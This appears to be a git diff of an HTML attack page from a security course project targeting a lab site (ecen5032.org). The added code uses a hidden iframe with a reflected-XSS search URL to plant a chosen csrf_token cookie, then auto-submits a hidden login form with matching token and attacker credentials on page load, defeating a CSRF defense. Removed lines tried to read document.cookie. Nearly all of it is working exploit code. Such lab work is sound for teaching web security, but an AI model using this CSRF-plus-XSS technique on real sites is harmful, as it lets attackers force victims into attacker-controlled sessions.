@@ -5,39 +5,22 @@
 <script src="http://code.jquery.com/jquery-1.9.1.js"></script>
 </head>
 <body>
-<iframe id="ecen" src="http://ecen5032.org" style="visibility: hidden;"></iframe>
+<iframe id="ecen" src="https://ecen5032.org/project2/search?q=%3Cscript%3Edocument.cookie%3D%27csrf_token%3D9f06e550e78ee7e297073fc935e72b1a%27%3C%2Fscript%3E" style="visibility: hidden;"></iframe>
 <form name="myForm" id="myForm"  action="http://ecen5032.org/project2/login?csrfdefense=1&xssdefense=0&" target="ecen">
-	<input type="hidden" name="csrf_token" value = goods/>
 	<input type="hidden" name="username" value="attacker"/>
-	<input type="hidden" name="password" value="l33th4x"/>
-	 <!-- console.log(decodeURIComponent(document.cookie)) -->
+	 <input type="hidden" name="password" value="l33th4x"/>
+	 <input type="hidden" name="csrf_token" value="9f06e550e78ee7e297073fc935e72b1a"/>
 	<input type="submit" style="position: absolute; left: -99999999px;">
 	</form>
 	<script type="text/javascript">
-window.onload = function func(){
- 	form = document.getElementById('myForm');
+		window.onload = function func(){
+ 		form = document.getElementById('myForm');
  	    function postIframe(target_url, method, pform)
     {
-				// gather the cookie value
-				var iframe = document.createElement("iframe");
-				document.body.appendChild(iframe);
-        iframe.style.display = "none";
-				var frame_name = "myIframe"
-				iframe.contentWindow.name = frame_name;
-
-
-				document.getElementById('myIframe').src = 'http://ecen5032.org/project2/login?csrfdefense=1&xssdefense=0&';
-
-
-				var goods=document.cookie.split(';')[2].substr(document.cookie.split(';')[2].indexOf('='),document.cookie.split(';')[2].length);
-				// console.log(goods);
-				// window.history.back();
-
         //Add iframe
         var iframe = document.createElement("iframe");
         document.body.appendChild(iframe);
         iframe.style.display = "none";
-
         //Give the frame a name
         var frame_name = "frame_name" + (new Date).getTime();
         iframe.contentWindow.name = frame_name;
@@ -48,6 +31,7 @@ window.onload = function func(){
         form.method = method;
         document.body.appendChild(form);
         form.submit();
+				console.log(form)
     }
     postIframe('http://ecen5032.org/project2/login', "POST", form);
 	// form.submit();
